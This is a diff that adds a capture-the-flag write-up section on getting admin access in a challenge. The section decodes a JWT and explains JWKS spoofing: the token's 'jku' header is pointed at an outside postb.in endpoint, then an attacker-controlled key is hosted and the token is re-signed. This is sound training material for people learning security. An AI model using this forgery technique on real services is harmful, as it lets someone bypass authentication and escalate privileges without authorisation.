@@ -83,6 +83,62 @@ Thrown exceptions pass the `load_cookie` check, so just send request with no `di
 `
 ## B'omarr Style (200)
 ## Flag Jokes (200)
+
+Need to set user as admin:
+![](images/2020-06-17-23-18-28.png)
+
+We get a JWT token in the cookie, decode it with [JWT Debugger](https://jwt.io):
+
+Header:
+```
+{
+  "alg": "RS256",
+  "jku": "http://localhost:5000/static/jwks.json",
+  "kid": "sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc"
+}
+```
+
+Payload
+```
+{
+  "username": "tom"
+}
+```
+
+The `jku` is an uri that references the public key used for generating the signature. We can try JWKS spoofing, where we change the ~jku~ field to our own server and see if we get a hit.
+
+`static/jwks.json` returns the following:
+```
+{
+    "keys": [
+        {
+            "e": "AQAB",
+            "kid": "sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc",
+            "kty": "RSA",
+            "n": "1bVdpTILcGSahuOL6IJCbUpDZTGFHc8lzQORNLQBXDiRd1cC1k5cG41iR1TYh74cp8HYmoLXy4U2bp7GUFm0ip_qzCxcabUwWCxF07TGsmiFmCUbcQ6vbJvnSZSZGe-RFPgHxrVzHgQzepNIY2TmjgXyqt8HNuKBJQ6NoTviyxZUqy65KtSBfLYh5XzFn3FPemOla8kGBu7moSbUpgO1t3m3LgxBV5y51E1xSSoC7nAYPFrQ9wOTHEh7kGxGUQqKtGswyi2ncH22VcfQkxMA0HerFMPOr2n9eEZEbeJFco9Gp3drAYDCyj0QbkJKGdbl_50cimZ7eXgeyc3lEEXL7Q"
+        }
+    ]
+}
+```
+Change the header to:
+
+```
+{
+  "alg": "RS256",
+  "jku": "https://postb.in/1592407627895-7120936170686",
+  "kid": "sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc"
+}
+```
+
+And you can see a hit.
+
+Create new JWT keys with: https://mkjwk.org
+
+And convert JWK to PEM: https://8gwifi.org/jwkconvertfunctions.jsp
+
+Host the public key somewhere and edit the JWT token
+
+
 ## Mongolian BBQ (225)
 ## Criss Cross (400)
 ## Trash The Cache (1000)
